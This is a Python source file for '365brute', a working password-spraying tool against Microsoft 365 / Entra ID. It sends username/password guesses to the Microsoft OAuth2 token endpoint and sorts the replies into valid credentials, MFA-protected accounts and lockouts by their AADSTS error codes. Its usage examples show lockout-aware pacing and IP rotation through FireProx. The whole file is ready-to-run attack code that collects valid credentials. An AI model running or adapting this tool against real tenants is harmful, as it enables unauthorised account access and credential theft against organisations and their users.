import requests
import argparse
import time
import sys

YELLOW = "\033[1;33m"
GREEN = "\033[1;32m"
RED = "\033[1;31m"
BLUE = "\033[1;34m"
MAGENTA = "\033[1;35m"
CYAN = "\033[1;36m"
RESET = "\033[0m"

PROTO = f"{CYAN}ENTRA{RESET}"
TARGET = "login.microsoftonline.com"

def nxc(tag, color, msg):
    print(f"{PROTO}  {TARGET:30} 443  {color}{tag}{RESET} {msg}")

def info(msg):
    nxc("[*]", BLUE, msg)

def success(msg):
    nxc("[+]", GREEN, msg)

def fail(msg):
    nxc("[-]", RED, msg)

def warn(msg):
    nxc("[!]", YELLOW, msg)

def debug(msg):
    nxc("[.]", MAGENTA, msg)

big_list_of_codes = {
    "AADSTS16000": "InteractionRequired",
    "AADSTS16001": "UserAccountSelectionInvalid",
    "AADSTS16002": "AppSessionSelectionInvalid",
    "AADSTS160021": "AppSessionSelectionInvalidSessionNotExist",
    "AADSTS16003": "SsoUserAccountNotFoundInResourceTenant",
    "AADSTS17003": "CredentialKeyProvisioningFailed",
    "AADSTS20001": "WsFedSignInResponseError",
    "AADSTS20012": "WsFedMessageInvalid",
    "AADSTS20033": "FedMetadataInvalidTenantName",
    "AADSTS230109": "CachedCredentialNonGWAuthNRequestsNotSupported",
    "AADSTS28002": "InvalidScope",
    "AADSTS28003": "EmptyScope",
    "AADSTS40008": "OAuth2IdPUnretryableServerError",
    "AADSTS40009": "OAuth2IdPRefreshTokenRedemptionUserError",
    "AADSTS40010": "OAuth2IdPRetryableServerError",
    "AADSTS40015": "OAuth2IdPAuthCodeRedemptionUserError",
    "AADSTS50000": "TokenIssuanceError",
    "AADSTS50001": "InvalidResource",
    "AADSTS50002": "NotAllowedTenant",
    "AADSTS500011": "InvalidResourceServicePrincipalNotFound",
    "AADSTS500021": "TenantRestriction",
    "AADSTS500022": "TenantRestriction",
    "AADSTS50003": "MissingSigningKey",
    "AADSTS50005": "DevicePolicyError",
    "AADSTS50006": "InvalidSignature",
    "AADSTS50007": "PartnerEncryptionCertificateMissing",
    "AADSTS50008": "InvalidSamlToken",
    "AADSTS5000819": "InvalidSamlTokenEmailMissingOrInvalid",
    "AADSTS50010": "AudienceUriValidationFailed",
    "AADSTS50011": "InvalidReplyTo",
    "AADSTS50012": "AuthenticationFailed",
    "AADSTS50013": "InvalidAssertion",
    "AADSTS500133": "AssertionExpired",
    "AADSTS50014": "GuestUserInPendingState",
    "AADSTS50017": "CertificateValidationFailed",
    "AADSTS50020": "UserUnauthorized",
    "AADSTS500208": "InvalidLoginDomain",
    "AADSTS500212": "NotAllowedByOutboundPolicy",
    "AADSTS500213": "NotAllowedByInboundPolicy",
    "AADSTS50027": "InvalidJwtToken",
    "AADSTS50029": "InvalidURI",
    "AADSTS50032": "WeakRsaKey",
    "AADSTS50033": "RetryableError",
    "AADSTS50042": "UnableToGeneratePairwiseIdentifier",
    "AADSTS50048": "SubjectMismatchesIssuer",
    "AADSTS50049": "NoSuchInstanceForDiscovery",
    "AADSTS50050": "MalformedDiscoveryRequest",
    "AADSTS50058": "UserInformationNotProvided",
    "AADSTS50061": "SignoutInvalidRequest",
    "AADSTS50064": "CredentialAuthenticationError",
    "AADSTS50072": "UserStrongAuthEnrollmentRequiredInterrupt",
    "AADSTS50074": "UserStrongAuthClientAuthNRequiredInterrupt",
    "AADSTS50078": "UserStrongAuthExpired",
    "AADSTS50085": "RefreshTokenNeedsSocialIdpLogin",
    "AADSTS50086": "SasNonRetryableError",
    "AADSTS50087": "SasRetryableError",
    "AADSTS50088": "TelecomMFALimitReached",
    "AADSTS50089": "FlowTokenExpired",
    "AADSTS50097": "DeviceAuthenticationRequired",
    "AADSTS50099": "PKeyAuthInvalidJwtUnauthorized",
    "AADSTS50105": "EntitlementGrantsNotFound",
    "AADSTS50107": "InvalidRealmUri",
    "AADSTS50120": "ThresholdJwtInvalidJwtFormat",
    "AADSTS50124": "ClaimsTransformationInvalidInputParameter",
    "AADSTS50125": "PasswordResetRegistrationRequired",
    "AADSTS50127": "BrokerAppNotInstalled",
    "AADSTS50129": "DeviceIsNotWorkplaceJoined",
    "AADSTS50131": "ConditionalAccessFailed",
    "AADSTS50132": "SsoArtifactInvalidOrExpired",
    "AADSTS50133": "SsoArtifactRevoked",
    "AADSTS50135": "PasswordChangeCompromisedPassword",
    "AADSTS50140": "KmsiInterrupt",
    "AADSTS50143": "SessionMismatch",
    "AADSTS50144": "InvalidPasswordExpiredOnPrem",
    "AADSTS50146": "MissingCustomSigningKey",
    "AADSTS50155": "DeviceAuthenticationFailed",
    "AADSTS50161": "InvalidExternalSecurityChallengeConfiguration",
    "AADSTS50166": "ExternalClaimsProviderThrottled",
    "AADSTS50173": "FreshTokenNeeded",
    "AADSTS50180": "WindowsIntegratedAuthMissing",
    "AADSTS50194": "NotMultitenantApp",
    "AADSTS50196": "LoopDetected",
    "AADSTS50197": "ConflictingIdentities",
    "AADSTS51000": "RequiredFeatureNotEnabled",
    "AADSTS51001": "DomainHintMustbePresent",
    "AADSTS1000104": "XCB2BResourceCloudNotAllowed",
    "AADSTS51004": "UserAccountNotInDirectory",
    "AADSTS53000": "DeviceNotCompliant",
    "AADSTS53001": "DeviceNotDomainJoined",
    "AADSTS53002": "ApplicationUsedIsNotAnApprovedApp",
    "AADSTS530035": "BlockedBySecurityDefaults",
    "AADSTS53004": "ProofUpBlockedDueToRisk",
    "AADSTS53011": "UserBlockedDueToRisk",
    "AADSTS530034": "DelegatedAdminBlockedDueToSuspiciousActivity",
    "AADSTS54000": "MinorUserBlockedLegalAgeGroupRule",
    "AADSTS65001": "DelegationDoesNotExist",
    "AADSTS65004": "UserDeclinedConsent",
    "AADSTS65005": "MisconfiguredApplication",
    "AADSTS70000": "InvalidGrant",
    "AADSTS70001": "UnauthorizedClient",
    "AADSTS700011": "UnauthorizedClientAppNotFound",
    "AADSTS70002": "InvalidClient",
    "AADSTS70003": "UnsupportedGrantType",
    "AADSTS70004": "InvalidRedirectUri",
    "AADSTS70005": "UnsupportedResponseType",
    "AADSTS70008": "ExpiredOrRevokedGrant",
    "AADSTS70011": "InvalidScope",
    "AADSTS70016": "AuthorizationPending",
    "AADSTS70018": "BadVerificationCode",
    "AADSTS70019": "CodeExpired",
    "AADSTS70043": "BadTokenDueToSignInFrequency",
    "AADSTS75001": "BindingSerializationError",
    "AADSTS75003": "UnsupportedBindingError",
    "AADSTS75005": "Saml2MessageInvalid",
    "AADSTS80001": "OnPremiseStoreIsNotAvailable",
    "AADSTS80002": "OnPremisePasswordValidatorRequestTimedout",
    "AADSTS80005": "OnPremisePasswordValidatorUnpredictableWebException",
    "AADSTS80007": "OnPremisePasswordValidatorErrorOccurredOnPrem",
    "AADSTS80010": "OnPremisePasswordValidationEncryptionException",
    "AADSTS80012": "OnPremisePasswordValidationAccountLogonInvalidHours",
    "AADSTS80013": "OnPremisePasswordValidationTimeSkew",
    "AADSTS81004": "DesktopSsoIdentityInTicketIsNotAuthenticated",
    "AADSTS90002": "InvalidTenantName",
    "AADSTS90004": "InvalidRequestFormat",
    "AADSTS90006": "ExternalServerRetryableError",
    "AADSTS90010": "NotSupported",
    "AADSTS9001023": "GrantTypeNotSupportedOnEndpoint",
    "AADSTS90012": "RequestTimeout",
    "AADSTS90014": "MissingRequiredField",
    "AADSTS90055": "TenantThrottlingError",
    "AADSTS90094": "AdminConsentRequired",
    "AADSTS90100": "InvalidRequestParameter",
    "AADSTS901002": "ResourceParamNotSupported",
    "AADSTS700016": "UnauthorizedClient_DoesNotMatchRequest",
    "AADSTS7000112": "UnauthorizedClientApplicationDisabled",
    "AADSTS530032": "BlockedByConditionalAccessOnSecurityPolicy",
}

description = """
365brute - Microsoft 365 / Entra ID Password Sprayer
Updated for 2024+ endpoints.
"""

epilog = """
EXAMPLES:
  Single password:
    python3 365brute.py -u userlist.txt -p Winter2020

  Password list with 30min delay between rounds:
    python3 365brute.py -u userlist.txt -P passwords.txt -d 1800

  With FireProx:
    python3 365brute.py -u userlist.txt -P passwords.txt -d 1800 --url https://api-gw.execute-api.us-east-1.amazonaws.com/fireprox -o results.txt
"""

parser = argparse.ArgumentParser(description=description, epilog=epilog, formatter_class=argparse.RawDescriptionHelpFormatter)

parser.add_argument("-u", "--userlist", metavar="FILE", required=True, help="File with usernames one-per-line (user@domain.com)")
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument("-p", "--password", help="A single password to spray")
group.add_argument("-P", "--passlist", metavar="FILE", help="File with passwords one-per-line to spray in rounds")
parser.add_argument("-o", "--out", metavar="OUTFILE", help="File to output valid results to")
parser.add_argument("-f", "--force", action='store_true', help="Don't stop on multiple account lockouts")
parser.add_argument("--url", default="https://login.microsoftonline.com", help="Target URL (default: https://login.microsoftonline.com)")
parser.add_argument("-v", "--verbose", action="store_true", help="Show valid usernames on invalid password")
parser.add_argument("-s", "--sleep", default=0, type=int, help="Seconds to sleep between each attempt")
parser.add_argument("-d", "--delay", default=0, type=int, help="Seconds to wait between password rounds (only with -P)")

args = parser.parse_args()

url = args.url
force = args.force
out = args.out
verbose = args.verbose
sleep_time = args.sleep
delay = args.delay

usernames = []
with open(args.userlist, "r") as f:
    usernames = [line.strip() for line in f if line.strip()]

passwords = []
if args.passlist:
    with open(args.passlist, "r") as f:
        passwords = [line.strip() for line in f if line.strip()]
else:
    passwords = [args.password]

username_count = len(usernames)
password_count = len(passwords)

print()
print(f"  {CYAN}365brute v1.0{RESET} - Microsoft 365 / Entra ID Password Sprayer")
print(f"  {BLUE}{'─' * 55}{RESET}")
print(f"  Users:     {username_count}")
print(f"  Passwords: {password_count}")
print(f"  Delay:     {delay}s between rounds")
print(f"  Sleep:     {sleep_time}s between attempts")
print(f"  Target:    {url}")
print(f"  Time:      {time.ctime()}")
print(f"  {BLUE}{'─' * 55}{RESET}")
print()

results = ""
total_lockouts = 0
lockout_question = False

for pwd_index, password in enumerate(passwords):
    if pwd_index > 0 and delay > 0:
        info(f"Round complete. Sleeping {YELLOW}{delay}s{RESET} before next round...")
        time.sleep(delay)

    info(f"Spraying password {CYAN}{pwd_index + 1}/{password_count}{RESET}: {YELLOW}{password}{RESET}")

    lockout_counter = 0
    attempt = 0
    for username in usernames:
        if attempt > 0 and sleep_time > 0:
            time.sleep(sleep_time)

        attempt += 1

        body = {
            'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
            'client_info': '1',
            'grant_type': 'password',
            'username': username,
            'password': password,
            'scope': 'https://graph.microsoft.com/.default openid',
        }

        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
        }

        try:
            r = requests.post(f"{url}/organizations/oauth2/v2.0/token", headers=headers, data=body)
        except requests.exceptions.ConnectionError:
            warn(f"Connection error on {username}")
            continue

        if r.status_code == 200:
            success(f"{username}:{password}")
            results += f"{username} : {password}\n"
            continue

        resp = r.json()
        error = resp.get("error_description", "")

        if "AADSTS50126" in error:
            if verbose:
                fail(f"{username}:{password}")
            continue

        elif "AADSTS50128" in error or "AADSTS50059" in error:
            warn(f"{username}:{password} {MAGENTA}(Tenant not found){RESET}")

        elif "AADSTS50034" in error:
            fail(f"{username}:{password} {MAGENTA}(User not found){RESET}")

        elif "AADSTS50076" in error:
            success(f"{username}:{password} {YELLOW}(MFA required){RESET}")
            results += f"{username} : {password}\n"

        elif "AADSTS50079" in error:
            success(f"{username}:{password} {YELLOW}(MFA enrollment needed){RESET}")
            results += f"{username} : {password}\n"

        elif "AADSTS50158" in error:
            success(f"{username}:{password} {YELLOW}(Conditional Access / DUO MFA){RESET}")
            results += f"{username} : {password}\n"

        elif "AADSTS53003" in error and "AADSTS530034" not in error:
            success(f"{username}:{password} {YELLOW}(Conditional Access blocks token){RESET}")
            results += f"{username} : {password}\n"

        elif "AADSTS50053" in error:
            warn(f"{username} {RED}LOCKED{RESET}")
            lockout_counter += 1
            total_lockouts += 1

        elif "AADSTS50057" in error:
            warn(f"{username}:{password} {MAGENTA}(Account disabled){RESET}")

        elif "AADSTS50055" in error:
            success(f"{username}:{password} {YELLOW}(Password expired){RESET}")
            results += f"{username} : {password}\n"

        else:
            matched = False
            for code, name in big_list_of_codes.items():
                if code in error:
                    matched = True
                    debug(f"{username}:{password} {MAGENTA}({name}){RESET}")
                    break
            if not matched:
                debug(f"{username}:{password} {MAGENTA}(Unknown: {error[:80]}){RESET}")

        if not force and lockout_counter >= 10 and not lockout_question:
            print()
            warn(f"{RED}Multiple account lockouts detected! ({lockout_counter} locked){RESET}")
            warn("Continue spraying? Smart Lockout may be active.")
            yes = {'yes', 'y'}
            no = {'no', 'n', ''}
            lockout_question = True
            choice = "X"
            while choice not in no and choice not in yes:
                choice = input(f"  {YELLOW}[Y/N]{RESET} (default N): ").lower()
            if choice in no:
                info("Spray cancelled by user.")
                break

    info(f"Round {pwd_index + 1}/{password_count} done — {attempt} attempts, {lockout_counter} lockouts")

print()
if results:
    print(f"  {GREEN}{'═' * 55}{RESET}")
    print(f"  {GREEN}VALID CREDENTIALS{RESET}")
    print(f"  {GREEN}{'═' * 55}{RESET}")
    for line in results.strip().split("\n"):
        print(f"  {GREEN}[+]{RESET} {line}")
    print(f"  {GREEN}{'═' * 55}{RESET}")

    if out:
        with open(out, 'w') as out_file:
            out_file.write(results)
        info(f"Results written to {CYAN}{out}{RESET}")
else:
    info("No valid credentials found.")

print()
